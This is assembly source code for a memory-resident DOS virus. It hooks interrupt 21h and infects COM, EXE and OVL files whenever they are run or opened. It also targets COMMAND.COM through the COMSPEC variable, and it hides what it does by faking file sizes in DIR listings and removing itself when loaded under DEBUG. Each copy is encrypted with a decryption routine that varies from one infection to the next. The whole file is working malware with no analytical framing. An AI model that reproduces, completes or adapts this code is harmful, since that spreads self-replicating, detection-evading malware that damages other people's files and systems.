;                                                                          
; Cover-Up:   If loaded with DEBUG, it will remove itself from memory.     
;             When doing a DIR, it will cover up the filesize increase.    
;                                                                          
;Notes:   Also infects on a file open if the file ends in COM,EXE or OVL   
;                                                                          
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; 
                                                                           
Stack_Size      Equ     512+1                                              
                                                                           
Code    Segment Para    Public  'CODE'                                     
        Assume  Cs:Code, Ds:Code                                           
        Org     0000h                                                      
                                                                           
Jmpfar  Macro   addr                                                       
        db      0EAh                                                       
        dd      addr                                                       
Endm                                                                       
                                                                           
Callfar Macro   addr                                                       
        db      09Ah                                                       
        dd      addr                                                       
Endm                                                                       
                                                                           
Retfar  Macro   num                                                        
        db      0CAh                                                       
        dw      num                                                        
Endm                                                                       
                                                                           
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; 
; Do a loop to decode the rest of the virus.                               
                                                                           
Virus_Begin:                                                               
                                                                           
V00:    Mov     Bx, offset V05-V05_Back                                    
V04:    Mov     Cx, offset Start_Code-(offset V05-V05_Back)                
V01:    Mov     Al, 00h                                                    
V02:    Add     Byte ptr Cs:[Bx], Al                                       
V03:    Xor     Al, 00h                                                    
        Inc     Bx                                                         
        Loop    V02                                                        
                                                                           
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; 
V05_Back        Equ     0                                                  
                                                                           
V05:    Sub     Bx, offset Start_Code                                      
        Xchg    Ax, Cx                                                     
        Dec     Ax                                                         
        Int     21h                                                        
        Or      Al, Ah                                                     
        Je      Run_Prog                                                   
        Push    Ds                                                         
        Xor     Di, Di                                                     
        Mov     Ds, Di                                                     
        Lds     Ax, Dword ptr Ds:[21h*4]                                   
        Mov     Word ptr Cs:[Bx].Saved_21, Ax                              
        Mov     Word ptr Cs:[Bx].Saved_21+2, Ds                            
        Mov     Cx, Es                                                     
        Dec     Cx                                                         
        Mov     Ds, Cx                                                     
        Sub     Word ptr Ds:[Di+03h], 3072/16                              
        Mov     Ax, Word ptr Ds:[Di+12h]                                   
        Sub     Ax, 3072/16                                                
        Mov     Word ptr Ds:[Di+12h], Ax                                   
        Mov     Es, Ax                                                     
        Sub     Ax, 1000h                                                  
        Mov     Word ptr Cs:[Bx+Dos_Seg-2], Ax                             
        Push    Cs                                                         
        Pop     Ds                                                         
        Mov     Si, Bx                                                     
        Mov     Cx, offset Start_Code                                      
        Cld                                                                
        Rep     Movsb                                                      
        Mov     Ds, Cx                                                     
        Cli                                                                
        Mov     Word ptr Ds:[21h*4], offset New_21                         
        Mov     Word ptr Ds:[21H*4]+2, Es                                  
        Sti                                                                
        Mov     Ax, 4BFFh                                                  
        Push    Bx                                                         
        Int     21h                                                        
        Pop     Bx                                                         
        Pop     Ds                                                         
        Push    Ds                                                         
        Pop     Es                                                         
                                                                           
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; 
                                                                           
Run_Prog:                                                                  
        Lea     Si, [Bx].Start_Code                                        
        Mov     Di, 0100h                                                  
        Cmp     Bx, Di                                                     
        Jb      Run_Exe                                                    
                                                                           
Run_COM:                                                                   
        Push    Di                                                         
        Movsw                                                              
        Movsw                                                              
        Ret                                                                
                                                                           
Run_EXE:                                                                   
        Mov     Ax, Es                                                     
        Add     Ax, 0010h                                                  
        Add     Word ptr Cs:[Si+02], Ax                                    
        Add     Word ptr Cs:[Si+04], Ax                                    
        Cli                                                                
        Mov     Sp, Word ptr Cs:[Si+06]                                    
        Mov     Ss, Word ptr Cs:[Si+04]                                    
        Sti                                                                
        Jmp     Dword ptr Cs:[Si+00]                                       
                                                                           
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; 
                                                                           
Check_Present:                                                             
        Inc     Ax                                                         
        Iret                                                               
                                                                           
New_21: Cmp     Ax, 0FFFFh              ; Checking if resident ?           
        Je      Check_Present                                              
        Cmp     Ah, 4Bh                 ; Executing a program ?            
        Je      Load_Program                                               
        Cmp     Ah, 11h                 ; Doing a DIR ?                    
        Je      Find_First                                                 
        Cmp     Ah, 12h                 ; Doing a DIR ?                    
        Je      Find_Next                                                  
        Cmp     Ax, 3D00h               ; Opening a file ?                 
        Jne     Run_21                                                     
        Call    Open_File                                                  
Run_21:                                                                    
        Jmpfar  0                       ; Goto vector 21h                  
Saved_21        Equ     $-4                                                
                                                                           
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; 
                                                                           
Find_First:                                                                
Find_Next:                                                                 
        Push    Bp                                                         
        Mov     Bp, Sp                                                     
        Cmp     Word ptr [Bp+04], 1234h                                    
Dos_Seg:                                                                   
        Pop     Bp                                                         
        Jb      Run_21                                                     
        Call    Do_21                                                      
        Call    Save_Regs                                                  
        Mov     Ah, 2Fh                                                    
        Call    Do_21                                                      
        Cmp     Byte ptr Es:[Bx], 0FFh                                     
        Je      F20                                                        
        Sub     Bx, +7                                                     
F20:    Mov     Al, Byte ptr Es:[Bx].1Eh                                   
        And     Al, 1Fh                                                    
        Cmp     Al, 1Fh                                                    
        Jne     F00                                                        
        Mov     Dx, Word ptr Es:[Bx].26h                                   
        Mov     Ax, Word ptr Es:[Bx].24h                                   
        Sub     Ax, offset Virus_End                                       
        Sbb     Dx, +00                                                    
        Or      Dx, Dx                                                     
        Jb      F00                                                        
        Mov     Word ptr Es:[Bx].26h, Dx                                   
        Mov     Word ptr Es:[Bx].24h, Ax                                   
F00:    Call    Restore_Regs                                               
        IRet                                                               
                                                                           
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; 
                                                                           
Load_Program:                                                              
        Cmp     Al, 01h                                                    
        Je      Disinfect_DEBUG                                            
        Cmp     Al, 0FFh                                                   
        Je      Infect_COMSPEC                                             
        Call    Infect_File                                                
        Jmp     Run_21                                                     
                                                                           
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; 
                                                                           
Infect_COMMAND:                                                            
        Push    Dx                                                         
        Push    Ds                                                         
        Mov     Dx, offset Command_File                                    
        Push    Cs                                                         
        Pop     Ds                                                         
        Mov     Byte ptr Ds:Command_Flag, 0FFh                             
        Call    Infect_File                                                
        Pop     Ds                                                         
        Pop     Dx                                                         
        Iret                                                               
                                                                           
Infect_COMSPEC:                                                            
        Mov     Ah, 51h                                                    
        Call    Do_21                                                      
        Mov     Es, Bx                                                     
        Mov     Ds, Es:[002Ch]                                             
        Xor     Si, Si                                                     
        Push    Cs                                                         
        Pop     Es                                                         
LP00:   Mov     Di, offset COMSPEC_name                                    
        Mov     Cx, 0004h                                                  
        Rep     Cmpsw                                                      
        Jcxz    LP20                                                       
LP10:   Lodsb                                                              
        Or      Al, Al                                                     
        Jne     LP10                                                       
;       Cmp     Al, Byte ptr [Si]                                          
        Cmp     Byte ptr [Si], 00                                          
        Jne     LP00                                                       
        Jmp     Infect_COMMAND                                             
LP20:   Mov     Dx, Si                                                     
        Mov     Byte ptr Cs:Command_Flag, 0FFh                             
        Call    Infect_File                                                
        IRet                                                               
                                                                           
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; 
                                                                           
Disinfect_DEBUG:                                                           
        Push    Es                                                         
        Push    Bx                                                         
        Call    Do_21                                                      
        Pop     Bx                                                         
        Pop     Es                                                         
        Call    Save_Regs                                                  
        Jb      LP30                                                       
        Xor     Cx, Cx                                                     
        Lds     Si, Dword ptr Es:[Bx].12h                                  
        Push    Ds                                                         
        Push    Si                                                         
        Mov     Di, 0100h                                                  
        Cmp     Si, Di                                                     
        Jl      DI00                                                       
        Ja      LP31                                                       
        Lodsb                                                              
        Cmp     Al, 0E9h                                                   
        Jne     LP31                                                       
        Lodsw                                                              
        Push    Ax                                                         
        Lodsb                                                              
        Cmp     Al, 'O'                                                    
        Pop     Si                                                         
        Jne     LP31                                                       
        Add     Si, 103h                                                   
        Inc     Cx                                                         
        Inc     Cx                                                         
        Pop     Ax                                                         
        Push    Si                                                         
        Push    Ds                                                         
        Pop     Es                                                         
        Jmp     short DI10                                                 
DI00:   Lea     Di, Dword ptr [Bx].0Eh                                     
        Cmp     Word ptr Es:[Di].00h, offset Virus_End+Stack_Size-2        
        Jne     LP31            ; Note 4B01/decrements stack by 2          
DI10:   Lodsb                                                              
        Cmp     Al, 0BBh                                                   
        Jne     LP31                                                       
        Lodsw                                                              
        Push    Ax                                                         
        Lodsw                                                              
        Cmp     Ax, Word ptr Cs:[V04]                                      
        Pop     Si                                                         
        Jne     LP31                                                       
        Add     Si, offset Start_Code-(offset V05-V05_Back)                
        Jcxz    DI15                                                       
        Rep     Movsw                                                      
        Jmp     short DI25                                                 
                                                                           
DI15:   Mov     Ah, 51h                                                    
        Call    Do_21                                                      
        Add     Bx, 0010h                                                  
        Mov     Ax, [Si+06h]                                               
        Dec     Ax                                                         
        Dec     Ax                                                         
        Stosw                                                              
        Mov     Ax, [Si+04h]                                               
        Add     Ax, Bx                                                     
        Stosw                                                              
        Movsw                                                              
        Lodsw                                                              
        Add     Ax, Bx                                                     
        Stosw                                                              
DI25:   Pop     Di                                                         
        Pop     Es                                                         
        Xchg    Cx, Ax                                                     
        Mov     Cx, offset Virus_End                                       
        Rep     Stosb                                                      
        Jmp     short LP32                                                 
                                                                           
LP31:   Pop     Ax                                                         
        Pop     Ax                                                         
LP32:   Xor     Ax, Ax                                                     
        Clc                                                                
LP30:   Call    Restore_Regs                                               
        Retfar  0002h                                                      
                                                                           
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; 
                                                                           
Open_File       Proc    Near                                               
        Call    Save_Regs                                                  
        Mov     Si, Dx                                                     
OF00:   Lodsb                                                              
        Or      Al, Al                                                     
        Je      OF50                                                       
        Cmp     Al, '.'                                                    
        Jne     OF00                                                       
        Mov     Di, offset File_Exts-3                                     
        Push    Cs                                                         
        Pop     Es                                                         
        Mov     Cx, 0003h                                                  
OF10:   Push    Cx                                                         
        Push    Si                                                         
        Mov     Cl, 03h                                                    
        Add     Di, Cx                                                     
        Push    Di                                                         
OF12:   Lodsb                                                              
        And     Al, 5Fh                                                    
        Cmp     Al, Byte ptr Es:[Di]                                       
        Jne     OF15                                                       
        Inc     Di                                                         
        Loop    OF12                                                       
        Call    Infect_File                                                
        Add     Sp, +6                                                     
        Jmp     short OF50                                                 
OF15:   Pop     Di                                                         
        Pop     Si                                                         
        Pop     Cx                                                         
        Loop    OF10                                                       
OF50:   Call    Restore_Regs                                               
        Ret                                                                
Open_File       Endp                                                       
                                                                           
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; 
                                                                           
Infect_File     Proc    Near                                               
        Call    Save_Regs                                                  
        Mov     Ax, 4300h                                                  
        Call    Do_21                                                      
        Jb      IF00                                                       
        Push    Cx                                                         
        And     Cl, 01h                                                    
        Cmp     Cl, 01h                                                    
        Pop     Cx                                                         
        Jne     H00                                                        
        And     Cl, 0FEh                                                   
        Mov     Ax, 4301h                                                  
        Call    Do_21                                                      
H00:    Mov     Ax, 3D02h                                                  
        Call    Do_21                                                      
        Jnb     IF02                                                       
IF00:   Jmp     IFE4                                                       
IF02:   Xchg    Bx, Ax                                                     
        Push    Cs                                                         
        Push    Cs                                                         
        Pop     Ds                                                         
        Pop     Es                                                         
        Mov     Ax, 5700h                                                  
        Call    Do_21                                                      
        Push    Dx                                                         
        Push    Cx                                                         
        And     Cl, 1Fh                                                    
        Cmp     Cl, 1Fh                                                    
        Je      IF05                                                       
        Mov     Dx, offset Exe_Header                                      
        Mov     Cx, offset Exe_Header_End-offset Exe_Header                
        Mov     Ah, 3Fh                                                    
        Call    Do_21                                                      
        Jnb     IF10                                                       
IF05:   Stc                                                                
        Jmp     IFE2                                                       
IF10:   Cmp     Ax, Cx                                                     
        Jne     IF05                                                       
        Xor     Dx, Dx                                                     
        Mov     Cx, Dx                                                     
        Mov     Ax, 4202h                                                  
        Call    Do_21                                                      
        Or      Dx, Dx                                                     
        Jne     IF12                                                       
        Cmp     Ax, offset Virus_End+Stack_Size                            
        Jb      IF05                                                       
IF12:   Cmp     Word ptr Ds:Sign, 'ZM'                                     
        Je      EXE_type                                                   
                                                                           
COM_type:                                                                  
        Cmp     Byte ptr Ds:Sign+3, 'O'                                    
        Je      IF05                                                       
        Cmp     Byte ptr Ds:Command_Flag, 00h                              
        Je      CT00                                                       
        Sub     Ax, offset Virus_End                                       
        Xchg    Dx, Ax                                                     
        Xor     Cx, Cx                                                     
        Mov     Ax, 4200h                                                  
        Call    Do_21                                                      
CT00:   Mov     Si, offset Sign                                            
        Mov     Di, offset Start_Code                                      
        Movsw                                                              
        Movsw                                                              
        Sub     Ax, 0003h                                                  
        Mov     Byte ptr Ds:Sign, 0E9h                                     
        Mov     Word ptr Ds:Sign+1, Ax                                     
        Mov     Byte ptr Ds:Sign+3, 'O'                                    
        Add     Ax, (offset V05-V05_Back)+0103H                            
        Jmp     short IF30                                                 
                                                                           
EXE_type:                                                                  
        Cmp     Word ptr Ds:Stack_Sp, offset Virus_End+Stack_Size          
        Je      IF05                                                       
        Cmp     Word ptr Ds:Overlay_Num, 0000h                             
        Jne     IF05                                                       
        Push    Dx                                                         
        Push    Ax                                                         
        Mov     Cl, 04h                                                    
        Ror     Dx, Cl                                                     
        Shr     Ax, Cl                                                     
        Add     Ax, Dx                                                     
        Sub     Ax, Word ptr Ds:Size_Header                                
        Mov     Si, offset Start_Ip                                        
        Mov     Di, offset Start_Code                                      
        Movsw                                                              
        Movsw                                                              
        Mov     Si, offset Stack_Ss                                        
        Movsw                                                              
        Movsw                                                              
        Mov     Word ptr Ds:Start_Cs, Ax                                   
        Mov     Word ptr Ds:Stack_Ss, Ax                                   
        Mov     Word ptr Ds:Stack_Sp, offset Virus_End+Stack_Size          
        Pop     Ax                                                         
        Pop     Dx                                                         
        Push    Ax                                                         
        Add     Ax, offset Virus_End+Stack_Size                            
        Jnb     IF29                                                       
        Inc     Dx                                                         
IF29:   Mov     Cx, 512                                                    
        Div     Cx                                                         
        Mov     Word ptr Ds:File_Size, Ax                                  
        Mov     Word ptr Ds:Remainder, Dx                                  
        Pop     Ax                                                         
        And     Ax, 000Fh                                                  
        Mov     Word ptr Ds:Start_Ip, Ax                                   
        Add     Ax, (offset V05-V05_Back)                                  
                                                                           
IF30:   Mov     Word ptr Ds:V00+1, Ax                                      
        Push    Ds                                                         
        Xor     Si, Si                                                     
        Mov     Ds, Si                                                     
        Mov     Ax, Word ptr Ds:[046Ch]                                    
        Pop     Ds                                                         
        Push    Bx                                                         
        Mov     Byte ptr Ds:V01+1, Ah                                      
        And     Ax, 000Fh                                                  
        Xchg    Bx, Ax                                                     
        Shl     Bx, 01h                                                    
        Mov     Ax, Word ptr [Bx].Random_AL                                
        Mov     Word ptr Ds:V03, Ax                                        
        Mov     Di, offset Real_End                                        
        Mov     Cx, offset Virus_End                                       
        Push    Cx                                                         
        Cld                                                                
        Rep     Movsb                                                      
        Mov     Bx, (offset V05-V05_Back)                                  
        Push    Word ptr [Bx]                                              
        Mov     Byte ptr [Bx+V05_Back], 0C3h                               
        Push    Bx                                                         
        Xor     Byte ptr Ds:([Bx+V02+1])-(offset V05-V05_Back), 28h        
        Add     Bx, offset Real_End     ; Toggle ADD [BX],AL/SUB [BX],AL   
        Call    V04                                                        
        Pop     Bx                                                         
        Pop     Word ptr [Bx]                                              
        Mov     Dx, offset Real_End                                        
        Pop     Cx                                                         
        Pop     Bx                                                         
        Mov     Ah, 40h                                                    
        Call    Do_21                                                      
IFE1:   Jb      IFE2                                                       
        Xor     Dx, Dx                                                     
        Mov     Cx, Dx                                                     
        Mov     Ax, 4200h                                                  
        Call    Do_21                                                      
        Jb      IFE2                                                       
        Mov     Dx, offset Exe_Header                                      
        Mov     Cx, offset Exe_Header_End-offset Exe_Header                
        Mov     Ah, 40h                                                    
        Call    Do_21                                                      
IFE2:   Pop     Cx                                                         
        Pop     Dx                                                         
        Jb      IFE3                                                       
        Cmp     Byte ptr Ds:Command_Flag, 0FFh                             
        Je      IFE3                                                       
        Or      Cl, 1Fh                                                    
IFE3:   Mov     Ax, 5701h                                                  
        Call    Do_21                                                      
        Mov     Ah, 3Eh                                                    
        Call    Do_21                                                      
IFE4:   Mov     Byte ptr Cs:Command_Flag, 00h                              
        Call    Restore_Regs                                               
        Ret                                                                
Infect_File     Endp                                                       
                                                                           
Do_21   Proc    Near                                                       
        Pushf                                                              
        Call    Dword ptr Cs:Saved_21                                      
        Ret                                                                
Do_21   Endp                                                               
                                                                           
Save_Regs:                                                                 
        Push    Bp                                                         
        Mov     Bp, Sp                                                     
        Push    Bx                                                         
        Push    Cx                                                         
        Push    Dx                                                         
        Push    Si                                                         
        Push    Di                                                         
        Push    Ds                                                         
        Push    Es                                                         
        Pushf                                                              
        Xchg    [Bp+02], Ax                                                
        Push    Ax                                                         
        Mov     Ax, [Bp+02]                                                
        Ret                                                                
                                                                           
Restore_Regs:                                                              
        Pop     Ax                                                         
        Xchg    [Bp+02], Ax                                                
        Popf                                                               
        Pop     Es                                                         
        Pop     Ds                                                         
        Pop     Di                                                         
        Pop     Si                                                         
        Pop     Dx                                                         
        Pop     Cx                                                         
        Pop     Bx                                                         
        Pop     Bp                                                         
        Ret                                                                
                                                                           
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; 
                                                                           
Random_AL:                                                                 
        Inc     Al                      ; 0                                
        Dec     Al                      ; 1                                
        Inc     Ax                      ; 2                                
        Inc     Ax                                                         
        Dec     Ax                      ; 3                                
        Dec     Ax                                                         
        Add     Al, Cl                  ; 4                                
        Sub     Al, Cl                  ; 5                                
        Xor     Al, Cl                  ; 6                                
        Xor     Al, Ch                  ; 7                                
        Not     Al                      ; 8                                
        Neg     Al                      ; 9                                
        Ror     Al, 01h                 ; A                                
        Rol     Al, 01h                 ; B                                
        Ror     Al, Cl                  ; C                                
        Rol     Al, Cl                  ; D                                
        Nop                             ; E                                
        Nop                                                                
        Add     Al, Ch                  ; F                                
                                                                           
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; 
                                                                           
COMSPEC_name    db      'COMSPEC='                                         
COMMAND_file    db      '\COMMAND.COM',0                                   
FILE_Exts       db      'COMEXEOVL'                                        
NUM_Exts        equ     3                                                  
                                                                           
Start_Code      dw      00000h                                             
                dw      0FFF0h                                             
Start_Stack     dw      ?                                                  
                dw      0FFFFh                                             
                                                                           
        Org     400h                                                       
Virus_End:                                                                 
                                                                           
Saved_24        dw      ?,?                                                
                                                                           
Command_Flag    db      0                                                  
                                                                           
Temp            dw      ?                                                  
                                                                           
Exe_Header:                                                                
Sign            dw      ?                                                  
Remainder       dw      ?                                                  
File_Size       dw      ?                                                  
Num_Real        dw      ?                                                  
Size_Header     dw      ?                                                  
Min_Above       dw      ?                                                  
Max_Above       dw      ?                                                  
Stack_Ss        dw      ?                                                  
Stack_Sp        dw      ?                                                  
CheckSum        dw      ?                                                  
Start_Ip        dw      ?                                                  
Start_Cs        dw      ?                                                  
Display_Real    dw      ?                                                  
Overlay_Num     dw      ?                                                  
Exe_Header_End:                                                            
                                                                           
Real_End:                                                                  
                                                                           
Code    Ends                                                               
        End     Virus_Begin                                                
